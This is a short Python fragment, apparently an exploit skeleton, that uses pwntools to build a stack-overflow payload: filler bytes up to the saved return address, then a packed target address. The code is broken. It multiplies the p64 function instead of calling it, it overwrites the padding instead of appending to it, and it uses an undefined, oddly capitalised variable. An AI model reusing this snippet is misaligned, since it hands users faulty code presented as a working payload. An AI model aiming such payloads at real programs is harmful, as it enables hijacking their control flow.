from pwn import *
# fills everything from the input start through the byte immediately before saved RIP
payload = b"A" * 9
#encodes 64-bit addresses in the little endian format expected by x86-64
payload = p64*(targeT_address)

